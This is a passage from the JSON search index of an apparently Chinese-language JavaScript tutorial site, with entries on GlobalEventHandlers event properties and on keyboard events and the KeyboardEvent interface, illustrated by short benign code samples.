ondragenter\uff1a\u88ab\u62d6\u52a8\u5143\u7d20\u8fdb\u5165\u5bb9\u5668\u5143\u7d20\u3002 ondragleave\uff1a\u88ab\u62d6\u52a8\u5143\u7d20\u79bb\u5f00\u5bb9\u5668\u5143\u7d20\u3002 ondragover\uff1a\u88ab\u62d6\u52a8\u5143\u7d20\u5728\u5bb9\u5668\u5143\u7d20\u4e0a\u65b9\uff0c\u6bcf\u9694\u51e0\u767e\u6beb\u79d2\u89e6\u53d1\u4e00\u6b21\u3002 ondrop\uff1a\u677e\u5f00\u9f20\u6807\u540e\uff0c\u88ab\u62d6\u52a8\u5143\u7d20\u653e\u5165\u5bb9\u5668\u5143\u7d20\u3002 <dialog> \u5bf9\u8bdd\u6846\u5143\u7d20\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002 oncancel onclose","title":"GlobalEventHandlers \u63a5\u53e3"},{"location":"events/globaleventhandlers/#globaleventhandlers","text":"\u6307\u5b9a\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\uff0c\u63a8\u8350\u4f7f\u7528\u7684\u65b9\u6cd5\u662f\u5143\u7d20\u7684 addEventListener \u65b9\u6cd5\u3002 1 div . addEventListener ( 'click' , clickHandler , false ); \u9664\u4e86\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u79cd\u65b9\u6cd5\u53ef\u4ee5\u76f4\u63a5\u6307\u5b9a\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\u3002 1 div . onclick = clickHandler ; \u8fd9\u4e2a\u63a5\u53e3\u662f\u7531 GlobalEventHandlers \u63a5\u53e3\u63d0\u4f9b\u7684\u3002\u5b83\u7684\u4f18\u70b9\u662f\u4f7f\u7528\u6bd4\u8f83\u65b9\u4fbf\uff0c\u7f3a\u70b9\u662f\u53ea\u80fd\u4e3a\u6bcf\u4e2a\u4e8b\u4ef6\u6307\u5b9a\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u5e76\u4e14\u65e0\u6cd5\u6307\u5b9a\u4e8b\u4ef6\u89e6\u53d1\u7684\u9636\u6bb5\uff08\u6355\u83b7\u9636\u6bb5\u8fd8\u662f\u5192\u6ce1\u9636\u6bb5\uff09\u3002 HTMLElement \u3001 Document \u548c Window \u90fd\u7ee7\u627f\u4e86\u8fd9\u4e2a\u63a5\u53e3\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5404\u79cd HTML \u5143\u7d20\u3001 document \u5bf9\u8c61\u3001 window \u5bf9\u8c61\u4e0a\u9762\u90fd\u53ef\u4ee5\u4f7f\u7528 GlobalEventHandlers \u63a5\u53e3\u63d0\u4f9b\u7684\u5c5e\u6027\u3002\u4e0b\u9762\u5c31\u5217\u51fa\u8fd9\u4e2a\u63a5\u53e3\u63d0\u4f9b\u7684\u4e3b\u8981\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002","title":"GlobalEventHandlers \u63a5\u53e3"},{"location":"events/globaleventhandlers/#globaleventhandlersonabort","text":"\u67d0\u4e2a\u5bf9\u8c61\u7684 abort \u4e8b\u4ef6\uff08\u505c\u6b62\u52a0\u8f7d\uff09\u53d1\u751f\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528 onabort \u5c5e\u6027\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\u3002 \u5404\u79cd\u5143\u7d20\u7684\u505c\u6b62\u52a0\u8f7d\u4e8b\u4ef6\uff0c\u5230\u5e95\u5982\u4f55\u89e6\u53d1\uff0c\u76ee\u524d\u5e76\u6ca1\u6709\u7edf\u4e00\u7684\u89c4\u5b9a\u3002\u56e0\u6b64\u5b9e\u9645\u4e0a\uff0c\u8fd9\u4e2a\u5c5e\u6027\u73b0\u5728\u4e00\u822c\u53ea\u7528\u5728 <img> \u5143\u7d20\u4e0a\u9762\u3002 1 2 3 4 5 6 // HTML \u4ee3\u7801\u5982\u4e0b // <img src=\"example.jpg\" id=\"img\"> var img = document . getElementById ( 'img' ); img . onabort = function () { console . log ( 'image load aborted.' ); }","title":"GlobalEventHandlers.onabort"},{"location":"events/globaleventhandlers/#globaleventhandlersonerror","text":"error \u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528 onerror \u5c5e\u6027\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\u3002 error \u4e8b\u4ef6\u5206\u6210\u4e24\u79cd\u3002 \u4e00\u79cd\u662f JavaScript \u7684\u8fd0\u884c\u65f6\u9519\u8bef\uff0c\u8fd9\u4f1a\u4f20\u5230 window \u5bf9\u8c61\uff0c\u5bfc\u81f4 window.onerror() \u3002 1 2 3 window . onerror = function ( message , source , lineno , colno , error ) { // ... } window.onerror \u7684\u5904\u7406\u51fd\u6570\u5171\u63a5\u53d7\u4e94\u4e2a\u53c2\u6570\uff0c\u542b\u4e49\u5982\u4e0b\u3002 message\uff1a\u9519\u8bef\u4fe1\u606f\u5b57\u7b26\u4e32 source\uff1a\u62a5\u9519\u811a\u672c\u7684 URL lineno\uff1a\u62a5\u9519\u7684\u884c\u53f7\uff0c\u662f\u4e00\u4e2a\u6574\u6570 colno\uff1a\u62a5\u9519\u7684\u5217\u53f7\uff0c\u662f\u4e00\u4e2a\u6574\u6570 error\uff1a \u9519\u8bef\u5bf9\u8c61 \u53e6\u4e00\u79cd\u662f\u8d44\u6e90\u52a0\u8f7d\u9519\u8bef\uff0c\u6bd4\u5982 <img> \u6216 <script> \u52a0\u8f7d\u7684\u8d44\u6e90\u51fa\u73b0\u52a0\u8f7d\u9519\u8bef\u3002\u8fd9\u65f6\uff0cError \u5bf9\u8c61\u4f1a\u4f20\u5230\u5bf9\u5e94\u7684\u5143\u7d20\uff0c\u5bfc\u81f4\u8be5\u5143\u7d20\u7684 onerror \u5c5e\u6027\u5f00\u59cb\u6267\u884c\u3002 1 2 3 element . onerror = function ( event ) { // ... } \u6ce8\u610f\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u8d44\u6e90\u7684\u52a0\u8f7d\u9519\u8bef\u4e0d\u4f1a\u89e6\u53d1 window.onerror \u3002","title":"GlobalEventHandlers.onerror"},{"location":"events/globaleventhandlers/#globaleventhandlersonloadglobaleventhandlersonloadstart","text":"\u5143\u7d20\u5b8c\u6210\u52a0\u8f7d\u65f6\uff0c\u4f1a\u89e6\u53d1 load \u4e8b\u4ef6\uff0c\u6267\u884c onload() \u3002\u5b83\u7684\u5178\u578b\u4f7f\u7528\u573a\u666f\u662f window \u5bf9\u8c61\u548c <img> \u5143\u7d20\u3002\u5bf9\u4e8e window \u5bf9\u8c61\u6765\u8bf4\uff0c\u53ea\u6709\u9875\u9762\u7684\u6240\u6709\u8d44\u6e90\u52a0\u8f7d\u5b8c\u6210\uff08\u5305\u62ec\u56fe\u7247\u3001\u811a\u672c\u3001\u6837\u5f0f\u8868\u3001\u5b57\u4f53\u7b49\u6240\u6709\u5916\u90e8\u8d44\u6e90\uff09\uff0c\u624d\u4f1a\u89e6\u53d1 load \u4e8b\u4ef6\u3002 \u5bf9\u4e8e <img> \u548c <video> \u7b49\u5143\u7d20\uff0c\u52a0\u8f7d\u5f00\u59cb\u65f6\u8fd8\u4f1a\u89e6\u53d1 loadstart \u4e8b\u4ef6\uff0c\u5bfc\u81f4\u6267\u884c onloadstart \u3002","title":"GlobalEventHandlers.onload\u3001GlobalEventHandlers.onloadstart"},{"location":"events/globaleventhandlers/#globaleventhandlersonfocusglobaleventhandlersonblur","text":"\u5f53\u524d\u5143\u7d20\u83b7\u5f97\u7126\u70b9\u65f6\uff0c\u4f1a\u89e6\u53d1 element.onfocus \uff1b\u5931\u53bb\u7126\u70b9\u65f6\uff0c\u4f1a\u89e6\u53d1 element.onblur \u3002 1 2 3 4 5 6 element . onfocus = function () { console . log ( \"onfocus event detected!\" ); }; element . onblur = function () { console . log ( \"onblur event detected!\" ); }; \u6ce8\u610f\uff0c\u5982\u679c\u4e0d\u662f\u53ef\u4ee5\u63a5\u53d7\u7528\u6237\u8f93\u5165\u7684\u5143\u7d20\uff0c\u8981\u89e6\u53d1 onfocus \uff0c\u8be5\u5143\u7d20\u5fc5\u987b\u6709 tabindex \u5c5e\u6027\u3002","title":"GlobalEventHandlers.onfocus\uff0cGlobalEventHandlers.onblur"},{"location":"events/globaleventhandlers/#globaleventhandlersonscroll","text":"\u9875\u9762\u6216\u5143\u7d20\u6eda\u52a8\u65f6\uff0c\u4f1a\u89e6\u53d1 scroll \u4e8b\u4ef6\uff0c\u5bfc\u81f4\u6267\u884c onscroll() \u3002","title":"GlobalEventHandlers.onscroll"},{"location":"events/globaleventhandlers/#globaleventhandlersoncontextmenuglobaleventhandlersonshow","text":"\u7528\u6237\u5728\u9875\u9762\u4e0a\u6309\u4e0b\u9f20\u6807\u7684\u53f3\u952e\uff0c\u4f1a\u89e6\u53d1 contextmenu \u4e8b\u4ef6\uff0c\u5bfc\u81f4\u6267\u884c oncontextmenu() \u3002\u5982\u679c\u8be5\u5c5e\u6027\u6267\u884c\u540e\u8fd4\u56de false \uff0c\u5c31\u7b49\u4e8e\u7981\u6b62\u4e86\u53f3\u952e\u83dc\u5355\u3002 document.oncontextmenu \u4e0e window.oncontextmenu \u6548\u679c\u4e00\u6837\u3002 1 2 3 document . oncontextmenu = function () { return false ; }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c oncontextmenu \u5c5e\u6027\u6267\u884c\u540e\u8fd4\u56de false \uff0c\u53f3\u952e\u83dc\u5355\u5c31\u4e0d\u4f1a\u51fa\u73b0\u3002 \u5143\u7d20\u7684\u53f3\u952e\u83dc\u5355\u663e\u793a\u65f6\uff0c\u4f1a\u89e6\u53d1\u8be5\u5143\u7d20\u7684 onshow \u76d1\u542c\u51fd\u6570\u3002","title":"GlobalEventHandlers.oncontextmenu\uff0cGlobalEventHandlers.onshow"},{"location":"events/globaleventhandlers/#_1","text":"\u9f20\u6807\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002 onclick ondblclick onmousedown onmouseenter onmouseleave onmousemove onmouseout onmouseover onmouseup onwheel \u952e\u76d8\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002 onkeydown onkeypress onkeyup \u7126\u70b9\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002 onblur onfocus \u8868\u5355\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002 oninput onchange onsubmit onreset oninvalid onselect \u89e6\u6478\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002 ontouchcancel ontouchend ontouchmove ontouchstart \u62d6\u52a8\u7684\u4e8b\u4ef6\u5c5e\u6027\u5206\u6210\u4e24\u7c7b\uff1a\u4e00\u7c7b\u4e0e\u88ab\u62d6\u52a8\u5143\u7d20\u76f8\u5173\uff0c\u53e6\u4e00\u7c7b\u4e0e\u63a5\u6536\u88ab\u62d6\u52a8\u5143\u7d20\u7684\u5bb9\u5668\u5143\u7d20\u76f8\u5173\u3002 \u88ab\u62d6\u52a8\u5143\u7d20\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002 ondragstart\uff1a\u62d6\u52a8\u5f00\u59cb ondrag\uff1a\u62d6\u52a8\u8fc7\u7a0b\u4e2d\uff0c\u6bcf\u9694\u51e0\u767e\u6beb\u79d2\u89e6\u53d1\u4e00\u6b21 ondragend\uff1a\u62d6\u52a8\u7ed3\u675f \u63a5\u6536\u88ab\u62d6\u52a8\u5143\u7d20\u7684\u5bb9\u5668\u5143\u7d20\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002 ondragenter\uff1a\u88ab\u62d6\u52a8\u5143\u7d20\u8fdb\u5165\u5bb9\u5668\u5143\u7d20\u3002 ondragleave\uff1a\u88ab\u62d6\u52a8\u5143\u7d20\u79bb\u5f00\u5bb9\u5668\u5143\u7d20\u3002 ondragover\uff1a\u88ab\u62d6\u52a8\u5143\u7d20\u5728\u5bb9\u5668\u5143\u7d20\u4e0a\u65b9\uff0c\u6bcf\u9694\u51e0\u767e\u6beb\u79d2\u89e6\u53d1\u4e00\u6b21\u3002 ondrop\uff1a\u677e\u5f00\u9f20\u6807\u540e\uff0c\u88ab\u62d6\u52a8\u5143\u7d20\u653e\u5165\u5bb9\u5668\u5143\u7d20\u3002 <dialog> \u5bf9\u8bdd\u6846\u5143\u7d20\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002 oncancel onclose","title":"\u5176\u4ed6\u7684\u4e8b\u4ef6\u5c5e\u6027"},{"location":"events/keyboard/","text":"\u952e\u76d8\u4e8b\u4ef6 \u00b6 \u952e\u76d8\u4e8b\u4ef6\u7684\u79cd\u7c7b \u00b6 \u952e\u76d8\u4e8b\u4ef6\u7531\u7528\u6237\u51fb\u6253\u952e\u76d8\u89e6\u53d1\uff0c\u4e3b\u8981\u6709 keydown \u3001 keypress \u3001 keyup \u4e09\u4e2a\u4e8b\u4ef6\uff0c\u5b83\u4eec\u90fd\u7ee7\u627f\u4e86 KeyboardEvent \u63a5\u53e3\u3002 keydown \uff1a\u6309\u4e0b\u952e\u76d8\u65f6\u89e6\u53d1\u3002 keypress \uff1a\u6309\u4e0b\u6709\u503c\u7684\u952e\u65f6\u89e6\u53d1\uff0c\u5373\u6309\u4e0b Ctrl\u3001Alt\u3001Shift\u3001Meta \u8fd9\u6837\u65e0\u503c\u7684\u952e\uff0c\u8fd9\u4e2a\u4e8b\u4ef6\u4e0d\u4f1a\u89e6\u53d1\u3002\u5bf9\u4e8e\u6709\u503c\u7684\u952e\uff0c\u6309\u4e0b\u65f6\u5148\u89e6\u53d1 keydown \u4e8b\u4ef6\uff0c\u518d\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\u3002 keyup \uff1a\u677e\u5f00\u952e\u76d8\u65f6\u89e6\u53d1\u8be5\u4e8b\u4ef6\u3002 \u5982\u679c\u7528\u6237\u4e00\u76f4\u6309\u952e\u4e0d\u677e\u5f00\uff0c\u5c31\u4f1a\u8fde\u7eed\u89e6\u53d1\u952e\u76d8\u4e8b\u4ef6\uff0c\u89e6\u53d1\u7684\u987a\u5e8f\u5982\u4e0b\u3002 keydown keypress keydown keypress ...\uff08\u91cd\u590d\u4ee5\u4e0a\u8fc7\u7a0b\uff09 keyup KeyboardEvent \u63a5\u53e3\u6982\u8ff0 \u00b6 KeyboardEvent \u63a5\u53e3\u7528\u6765\u63cf\u8ff0\u7528\u6237\u4e0e\u952e\u76d8\u7684\u4e92\u52a8\u3002\u8fd9\u4e2a\u63a5\u53e3\u7ee7\u627f\u4e86 Event \u63a5\u53e3\uff0c\u5e76\u4e14\u5b9a\u4e49\u4e86\u81ea\u5df1\u7684\u5b9e\u4f8b\u5c5e\u6027\u548c\u5b9e\u4f8b\u65b9\u6cd5\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b KeyboardEvent \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u65b0\u5efa\u952e\u76d8\u4e8b\u4ef6\u7684\u5b9e\u4f8b\u3002 1 new KeyboardEvent ( type , options ) KeyboardEvent \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u7c7b\u578b\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u4e8b\u4ef6\u914d\u7f6e\u5bf9\u8c61\uff0c\u8be5\u53c2\u6570\u53ef\u9009\u3002\u9664\u4e86 Event \u63a5\u53e3\u63d0\u4f9b\u7684\u5c5e\u6027\uff0c\u8fd8\u53ef\u4ee5\u914d\u7f6e\u4ee5\u4e0b\u5b57\u6bb5\uff0c\u5b83\u4eec\u90fd\u662f\u53ef\u9009\u3002 key \uff1a\u5b57\u7b26\u4e32\uff0c\u5f53\u524d\u6309\u4e0b\u7684\u952e\uff0c\u9ed8\u8ba4\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002 code \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u6309\u4e0b\u7684\u952e\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u9ed8\u8ba4\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002 location \uff1a\u6574\u6570\uff0c\u5f53\u524d\u6309\u4e0b\u7684\u952e\u7684\u4f4d\u7f6e\uff0c\u9ed8\u8ba4\u4e3a 0 \u3002 ctrlKey \uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u6309\u4e0b Ctrl \u952e\uff0c\u9ed8\u8ba4\u4e3a false \u3002 shiftKey \uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u6309\u4e0b Shift \u952e\uff0c\u9ed8\u8ba4\u4e3a false \u3002 altKey \uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u6309\u4e0b Alt \u952e\uff0c\u9ed8\u8ba4\u4e3a false \u3002 metaKey \uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u6309\u4e0b Meta \u952e\uff0c\u9ed8\u8ba4\u4e3a false \u3002 repeat \uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u91cd\u590d\u6309\u952e\uff0c\u9ed8\u8ba4\u4e3a false \u3002 KeyboardEvent \u7684\u5b9e\u4f8b\u5c5e\u6027 \u00b6 KeyboardEvent.altKey\uff0cKeyboardEvent.ctrlKey\uff0cKeyboardEvent.metaKey\uff0cKeyboardEvent.shiftKey \u00b6 \u4ee5\u4e0b\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u5c5e\u6027\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u6309\u4e0b\u5bf9\u5e94\u7684\u952e\u3002 KeyboardEvent.altKey \uff1a\u662f\u5426\u6309\u4e0b Alt \u952e KeyboardEvent.ctrlKey \uff1a\u662f\u5426\u6309\u4e0b Ctrl \u952e KeyboardEvent.metaKey \uff1a\u662f\u5426\u6309\u4e0b meta \u952e\uff08Mac \u7cfb\u7edf\u662f\u4e00\u4e2a\u56db\u74e3\u7684\u5c0f\u82b1\uff0cWindows \u7cfb\u7edf\u662f windows \u952e\uff09 KeyboardEvent.shiftKey \uff1a\u662f\u5426\u6309\u4e0b Shift \u952e \u4e0b\u9762\u662f\u4e00\u4e2a\u793a\u4f8b\u3002 1 2 3 4 5 6 7 8 function showChar ( e ) { console . log ( 'ALT: ' + e . altKey ); console . log ( 'CTRL: ' + e . ctrlKey ); console . log ( 'Meta: ' + e . metaKey ); console . log ( 'Shift: ' + e . shiftKey ); } document . body . addEventListener ( 'keydown' , showChar , false ); KeyboardEvent.code \u00b6 KeyboardEvent.code \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u6309\u4e0b\u7684\u952e\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 \u4e0b\u9762\u662f\u4e00\u4e9b\u5e38\u7528\u952e\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u5176\u4ed6\u952e\u8bf7\u67e5 \u6587\u6863 \u3002 \u6570\u5b57\u952e0 - 9\uff1a\u8fd4\u56de digit0 - digit9 \u5b57\u6bcd\u952eA - z\uff1a\u8fd4\u56de KeyA - KeyZ \u529f\u80fd\u952eF1 - F12\uff1a\u8fd4\u56de F1 - F12 \u65b9\u5411\u952e\uff1a\u8fd4\u56de ArrowDown \u3001 ArrowUp \u3001 ArrowLeft \u3001 ArrowRight Alt \u952e\uff1a\u8fd4\u56de AltLeft \u6216 AltRight Shift \u952e\uff1a\u8fd4\u56de ShiftLeft \u6216 ShiftRight Ctrl \u952e\uff1a\u8fd4\u56de ControlLeft \u6216 ControlRight KeyboardEvent.key \u00b6 KeyboardEvent.key \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6309\u4e0b\u7684\u952e\u540d\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 \u5982\u679c\u6309\u4e0b\u7684\u952e\u4ee3\u8868\u53ef\u6253\u5370\u5b57\u7b26\uff0c\u5219\u8fd4\u56de\u8fd9\u4e2a\u5b57\u7b26\uff0c\u6bd4\u5982\u6570\u5b57\u3001\u5b57\u6bcd\u3002 \u5982\u679c\u6309\u4e0b\u7684\u952e\u4ee3\u8868\u4e0d\u53ef\u6253\u5370\u7684\u7279\u6b8a\u5b57\u7b26\uff0c\u5219\u8fd4\u56de\u9884\u5b9a\u4e49\u7684\u952e\u503c\uff0c\u6bd4\u5982 Backspace\uff0cTab\uff0cEnter\uff0cShift\uff0cControl\uff0cAlt\uff0cCapsLock\uff0cEsc\uff0cSpacebar\uff0cPageUp\uff0cPageDown\uff0cEnd\uff0cHome\uff0cLeft\uff0cRight\uff0cUp\uff0cDown\uff0cPrintScreen\uff0cInsert\uff0cDel\uff0cWin\uff0cF1\uff5eF12\uff0cNumLock\uff0cScroll \u7b49\u3002 \u5982\u679c\u540c\u65f6\u6309\u4e0b\u4e00\u4e2a\u63a7\u5236\u952e\u548c\u4e00\u4e2a\u7b26\u53f7\u952e\uff0c\u5219\u8fd4\u56de\u7b26\u53f7\u952e\u7684\u952e\u540d\u3002\u6bd4\u5982\uff0c\u6309\u4e0b Ctrl + a\uff0c\u5219\u8fd4\u56de a \uff1b\u6309\u4e0b Shift + a\uff0c\u5219\u8fd4\u56de\u5927\u5199\u7684 A \u3002 \u5982\u679c\u65e0\u6cd5\u8bc6\u522b\u952e\u540d\uff0c\u8fd4\u56de\u5b57\u7b26\u4e32 Unidentified \u3002 KeyboardEvent.location \u00b6 KeyboardEvent.location \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u6309\u4e0b\u7684\u952e\u5904\u5728\u952e\u76d8\u7684\u54ea\u4e00\u4e2a\u533a\u57df\u3002\u5b83\u53ef\u80fd\u53d6\u4ee5\u4e0b\u503c\u3002 0\uff1a\u5904\u5728\u952e\u76d8\u7684\u4e3b\u533a\u57df\uff0c\u6216\u8005\u65e0\u6cd5\u5224\u65ad\u5904\u4e8e\u54ea\u4e00\u4e2a\u533a\u57df\u3002 1\uff1a\u5904\u5728\u952e\u76d8\u7684\u5de6\u4fa7\uff0c\u53ea\u9002\u7528\u90a3\u4e9b\u6709\u4e24\u4e2a\u4f4d\u7f6e\u7684\u952e\uff08\u6bd4\u5982 Ctrl \u548c Shift \u952e\uff09\u3002 2\uff1a\u5904\u5728\u952e\u76d8\u7684\u53f3\u4fa7\uff0c\u53ea\u9002\u7528\u90a3\u4e9b\u6709\u4e24\u4e2a\u4f4d\u7f6e\u7684\u952e\uff08\u6bd4\u5982 Ctrl \u548c Shift \u952e\uff09\u3002 3\uff1a\u5904\u5728\u6570\u5b57\u5c0f\u952e\u76d8\u3002 KeyboardEvent.repeat \u00b6 KeyboardEvent.repeat \u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u4ee3\u8868\u8be5\u952e\u662f\u5426\u88ab\u6309\u7740\u4e0d\u653e\uff0c\u4ee5\u4fbf\u5224\u65ad\u662f\u5426\u91cd\u590d\u8fd9\u4e2a\u952e\uff0c\u5373\u6d4f\u89c8\u5668\u4f1a\u6301\u7eed\u89e6\u53d1 keydown \u548c keypress \u4e8b\u4ef6\uff0c\u76f4\u5230\u7528\u6237\u677e\u5f00\u624b\u4e3a\u6b62\u3002 KeyboardEvent \u7684\u5b9e\u4f8b\u65b9\u6cd5 \u00b6 KeyboardEvent.getModifierState() \u00b6 KeyboardEvent.getModifierState() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u6309\u4e0b\u6216\u6fc0\u6d3b\u6307\u5b9a\u7684\u529f\u80fd\u952e\u3002\u5b83\u7684\u5e38\u7528\u53c2\u6570\u5982\u4e0b\u3002 Alt \uff1aAlt \u952e CapsLock \uff1a\u5927\u5199\u9501\u5b9a\u952e Control \uff1aCtrl \u952e Meta \uff1aMeta \u952e NumLock \uff1a\u6570\u5b57\u952e\u76d8\u5f00\u5173\u952e Shift \uff1aShift \u952e 1 2 3 4 5 6 7 if ( event . getModifierState ( 'Control' ) + event . getModifierState ( 'Alt' ) + event . getModifierState ( 'Meta' ) > 1 ) { return ; } \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u53ea\u8981 Control \u3001 Alt \u3001 Meta \u91cc\u9762\uff0c\u540c\u65f6\u6309\u4e0b\u4efb\u610f\u4e24\u4e2a\u6216\u4e24\u4e2a\u4ee5\u4e0a\u7684\u952e\u5c31\u8fd4\u56de\u3002","title":"\u952e\u76d8\u4e8b\u4ef6"},{"location":"events/keyboard/#_1","text":"","title":"\u952e\u76d8\u4e8b\u4ef6"},{"location":"events/keyboard/#_2","text":"\u952e\u76d8\u4e8b\u4ef6\u7531\u7528\u6237\u51fb\u6253\u952e\u76d8\u89e6\u53d1\uff0c\u4e3b\u8981\u6709 keydown \u3001 keypress \u3001 keyup \u4e09\u4e2a\u4e8b\u4ef6\uff0c\u5b83\u4eec\u90fd\u7ee7\u627f\u4e86 KeyboardEvent \u63a5\u53e3\u3002 keydown \uff1a\u6309\u4e0b\u952e\u76d8\u65f6\u89e6\u53d1\u3002 keypress \uff1a\u6309\u4e0b\u6709\u503c\u7684\u952e\u65f6\u89e6\u53d1\uff0c\u5373\u6309\u4e0b Ctrl\u3001Alt\u3001Shift\u3001Meta \u8fd9\u6837\u65e0\u503c\u7684\u952e\uff0c\u8fd9\u4e2a\u4e8b\u4ef6\u4e0d\u4f1a\u89e6\u53d1\u3002\u5bf9\u4e8e\u6709\u503c\u7684\u952e\uff0c\u6309\u4e0b\u65f6\u5148\u89e6\u53d1 keydown \u4e8b\u4ef6\uff0c\u518d\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\u3002 keyup \uff1a\u677e\u5f00\u952e\u76d8\u65f6\u89e6\u53d1\u8be5\u4e8b\u4ef6\u3002 \u5982\u679c\u7528\u6237\u4e00\u76f4\u6309\u952e\u4e0d\u677e\u5f00\uff0c\u5c31\u4f1a\u8fde\u7eed\u89e6\u53d1\u952e\u76d8\u4e8b\u4ef6\uff0c\u89e6\u53d1\u7684\u987a\u5e8f\u5982\u4e0b\u3002 keydown keypress keydown keypress ...\uff08\u91cd\u590d\u4ee5\u4e0a\u8fc7\u7a0b\uff09 keyup","title":"\u952e\u76d8\u4e8b\u4ef6\u7684\u79cd\u7c7b"},{"location":"events/keyboard/#keyboardevent","text":"KeyboardEvent \u63a5\u53e3\u7528\u6765\u63cf\u8ff0\u7528\u6237\u4e0e\u952e\u76d8\u7684\u4e92\u52a8\u3002\u8fd9\u4e2a\u63a5\u53e3\u7ee7\u627f\u4e86 Event \u63a5\u53e3\uff0c\u5e76\u4e14\u5b9a\u4e49\u4e86\u81ea\u5df1\u7684\u5b9e\u4f8b\u5c5e\u6027\u548c\u5b9e\u4f8b\u65b9\u6cd5\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b KeyboardEvent \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u65b0\u5efa\u952e\u76d8\u4e8b\u4ef6\u7684\u5b9e\u4f8b\u3002 1 new KeyboardEvent ( type , options ) KeyboardEvent \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u7c7b\u578b\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u4e8b\u4ef6\u914d\u7f6e\u5bf9\u8c61\uff0c\u8be5\u53c2\u6570\u53ef\u9009\u3002\u9664\u4e86 Event \u63a5\u53e3\u63d0\u4f9b\u7684\u5c5e\u6027\uff0c\u8fd8\u53ef\u4ee5\u914d\u7f6e\u4ee5\u4e0b\u5b57\u6bb5\uff0c\u5b83\u4eec\u90fd\u662f\u53ef\u9009\u3002 key \uff1a\u5b57\u7b26\u4e32\uff0c\u5f53\u524d\u6309\u4e0b\u7684\u952e\uff0c\u9ed8\u8ba4\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002 code \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u6309\u4e0b\u7684\u952e\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u9ed8\u8ba4\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002 location \uff1a\u6574\u6570\uff0c\u5f53\u524d\u6309\u4e0b\u7684\u952e\u7684\u4f4d\u7f6e\uff0c\u9ed8\u8ba4\u4e3a 0 \u3002 ctrlKey \uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u6309\u4e0b Ctrl \u952e\uff0c\u9ed8\u8ba4\u4e3a false \u3002 shiftKey \uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u6309\u4e0b Shift \u952e\uff0c\u9ed8\u8ba4\u4e3a false \u3002 altKey \uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u6309\u4e0b Alt \u952e\uff0c\u9ed8\u8ba4\u4e3a false \u3002 metaKey \uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u6309\u4e0b Meta \u952e\uff0c\u9ed8\u8ba4\u4e3a false \u3002 repeat \uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u91cd\u590d\u6309\u952e\uff0c\u9ed8\u8ba4\u4e3a false \u3002","title":"KeyboardEvent 